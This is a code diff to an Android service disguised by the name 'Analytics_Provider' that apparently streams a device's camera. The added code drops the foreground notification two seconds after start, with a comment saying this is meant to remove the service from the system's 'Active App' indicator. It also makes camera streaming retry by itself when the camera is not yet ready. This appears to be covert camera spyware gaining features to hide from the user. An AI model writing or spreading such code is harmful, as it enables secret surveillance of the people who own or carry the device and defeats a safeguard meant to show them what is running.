@@ -197,12 +197,30 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         } else {
             startForeground(NOTIFICATION_ID, notification);
         }
+
+        // Remove from Samsung / Android 12+ "1 Active App" Recents Header
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try {
+                    stopForeground(true);
+                } catch (Exception ignored) {}
+            }, 2000);
+        }
     }
 
     @androidx.camera.camera2.interop.ExperimentalCamera2Interop
     public void startStreaming(String cameraId, int width, int height, int quality) {
         if (cameraProvider == null) {
-            Log.e(TAG, "OPTICS_ERROR: CameraProvider not ready. Deferring stream...");
+            Log.w(TAG, "OPTICS_WARN: CameraProvider not ready yet. Scheduling stream start...");
+            com.google.common.util.concurrent.ListenableFuture<ProcessCameraProvider> future = ProcessCameraProvider.getInstance(this);
+            future.addListener(() -> {
+                try {
+                    cameraProvider = future.get();
+                    startStreaming(cameraId, width, height, quality);
+                } catch (Exception e) {
+                    Log.e(TAG, "CameraProvider init error: " + e.getMessage());
+                }
+            }, androidx.core.content.ContextCompat.getMainExecutor(this));
             return;
         }
         
@@ -256,6 +274,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
                                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                                 .setTargetRotation(targetRotation)
+                                .setTargetResolution(new android.util.Size(streamWidth, streamHeight))
                                 .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
 
                         imageAnalysis = analysisBuilder.build();
